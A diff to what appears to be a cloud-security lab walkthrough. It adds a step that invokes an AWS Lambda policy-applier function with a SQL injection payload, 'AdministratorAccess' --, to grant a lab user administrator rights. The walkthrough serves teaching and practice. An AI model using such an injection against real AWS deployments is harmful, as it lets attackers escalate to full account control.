@@ -266,7 +266,12 @@ aws --profile assumed_role --region us-east-1 lambda get-function --function-nam
 </p>
 
 * Invoke the role applier lambda function, passing the name of the bilbo user and the **injection** payload.
-
+```bash
+#The following command will send a SQL injection payload to the lambda function
+aws --profile assumed_role --region us-east-1 lambda invoke --function-name [policy_applier_lambda_name] --cli-binary-format raw-in-base64-out --payload '{"policy_names": ["AdministratorAccess'"'"' --"], "user_name": [bilbo_user_name_here]}' out.txt
+#cat the results to confirm everything is working properly
+cat out.txt
+```
 <p align="center">
   <img src="/images/cloud/vullam5.png">
 </p>
